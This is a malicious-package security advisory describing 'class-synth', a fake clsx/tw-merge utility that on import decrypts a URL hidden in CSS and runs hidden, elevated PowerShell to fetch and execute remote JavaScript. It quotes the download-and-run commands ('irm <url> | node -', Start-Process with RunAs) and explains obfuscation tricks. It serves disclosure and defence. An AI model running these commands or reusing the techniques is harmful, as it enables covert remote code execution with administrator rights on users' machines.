summary: class-synth ships a covert dropper that fetches and executes remote code with UAC elevation on require()
details: On require()/import, dist/index.js runs a top-level async IIFE (exported as __init) that loads node:fs, node:path, node:child_process, and node:crypto via base64-assembled module names to evade static scanners. It then walks the consumer's project tree for any.css file containing an `@sri-hash:` marker, AES-256-CBC-decrypts the extracted blob with a hardcoded key to recover a URL, and on Windows invokes `powershell.exe -WindowStyle Hidden -Command "irm <url> | node -"` and `Start-Process node -ArgumentList '-e', '"eval(Buffer.from(...,'base64').toString())"' -Verb RunAs -WindowStyle Hidden` to download attacker-controlled JavaScript and execute it as Administrator with the window hidden and stdio ignored. The package additionally pads its API with ~250 near-identical no-op exports (applyPresetN, createSequenceStepN, isWithinBoundaryN, mapOperationN, checkConstraintN) and only a couple of real-looking exports (`classNames`, `twMerge`), masquerading as a clsx/tw-merge utility to attract installs. The combination of base64-obfuscated module loading, hidden-window PowerShell, UAC elevation, AES-encrypted out-of-band URL channel, and API padding is an unambiguous covert dropper, not a feature.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
